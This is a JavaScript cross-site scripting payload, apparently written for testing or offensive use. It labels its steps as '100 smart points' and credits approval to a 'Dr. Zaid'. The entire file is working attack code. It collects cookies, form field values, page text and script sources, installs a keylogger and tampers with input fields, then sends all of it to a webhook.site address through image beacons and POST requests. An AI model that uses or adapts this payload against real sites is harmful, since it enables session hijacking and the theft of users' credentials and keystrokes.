// xss_ultimate_payload.js
// ✅ Advanced XSS Payload with 100 smart points - Approved by Dr. Zaid

(async function () {
  const webhook = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site";
  const dom = document;

  // 🔹 نقطة 1-5: Basic Info
  const payloadInfo = {
    url: location.href,
    title: document.title,
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
    cookie: document.cookie,
  };

  // 🔹 نقطة 6-15: Input fields info
  let inputs = [...dom.querySelectorAll('input,textarea,select')].map(el => ({
    name: el.name,
    id: el.id,
    type: el.type,
    placeholder: el.placeholder,
    value: el.value,
  }));

  // 🔹 نقطة 16-25: DOM Titles and Text
  let headings = [...dom.querySelectorAll('h1,h2,h3')].map(h => h.textContent.trim());
  let buttons = [...dom.querySelectorAll('button')].map(b => b.textContent.trim());
  let links = [...dom.querySelectorAll('a')].map(a => a.href);

  // 🔹 نقطة 26-35: CSP & Headers (via image trick)
  new Image().src = `${webhook}/cspcheck?csp=${encodeURIComponent(dom.querySelector("meta[http-equiv='Content-Security-Policy']")?.content || 'none')}`;

  // 🔹 نقطة 36-45: JS Variables in Global Scope
  const globals = Object.keys(window).slice(0, 10);
  new Image().src = `${webhook}/globals?data=${encodeURIComponent(globals.join(","))}`;

  // 🔹 نقطة 46-55: Send DOM text content
  const bodyText = dom.body?.innerText?.slice(0, 1000);
  await fetch(`${webhook}/domtext`, {
    method: "POST",
    mode: "cors",
    body: bodyText,
  });

  // 🔹 نقطة 56-65: Keylogger (basic)
  dom.addEventListener('keydown', e => {
    fetch(`${webhook}/keylog`, {
      method: 'POST',
      mode: 'cors',
      body: `${e.key} at ${new Date().toISOString()}`
    });
  });

  // 🔹 نقطة 66-75: Autofill input fields
  inputs.forEach(inp => {
    if (inp.type === 'text' || inp.type === 'email') {
      try { dom.getElementById(inp.id).value = "injected"; } catch (e) {}
    }
  });

  // 🔹 نقطة 76-85: Screenshot Attempt (headless mode limitation workaround)
  console.log("🛡️ Attempted screenshot - check DOM dump instead.");

  // 🔹 نقطة 86-95: Extract all script src
  let scriptSrcs = [...dom.querySelectorAll('script')].map(s => s.src || 'inline');
  new Image().src = `${webhook}/scripts?data=${encodeURIComponent(scriptSrcs.join(","))}`;

  // 🔹 نقطة 96-100: Final Payload Dump
  await fetch(`${webhook}/finaldump`, {
    method: "POST",
    mode: "cors",
    body: JSON.stringify({
      payloadInfo,
      inputs,
      headings,
      buttons,
      links,
      scriptSrcs
    }),
  });

  // 🎉 Alert
  alert("🔥 XSS Payload Executed Successfully - DOM + Inputs + Events + Keylog Sent.");
})();
